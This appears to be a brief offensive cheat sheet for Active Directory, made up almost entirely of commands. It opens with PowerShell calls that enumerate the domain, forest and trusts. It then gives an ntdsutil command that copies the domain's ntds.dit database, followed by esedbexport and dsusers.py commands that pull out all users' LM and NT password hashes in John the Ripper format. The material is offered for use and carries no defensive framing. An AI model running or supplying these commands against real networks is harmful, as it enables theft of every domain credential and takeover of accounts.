# AD
## Reco
```
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
//https://adsecurity.org/?p=2535
```
ntds.dit Exfiltration
* Dump NTDS
```
ntdsutil "activate instance ntds" "ifm" "create full C:\tmpntds" "quit" "quit"
```
* NTDS Extraction
```
esedbexport -m tables ntds.dit
dsusers.py DATATABLE LINK_TABLE OUTPUT --syshive SYSTEM --lmoutfile LM --ntoutfile NT --passwordhashes --pwdformat john
````
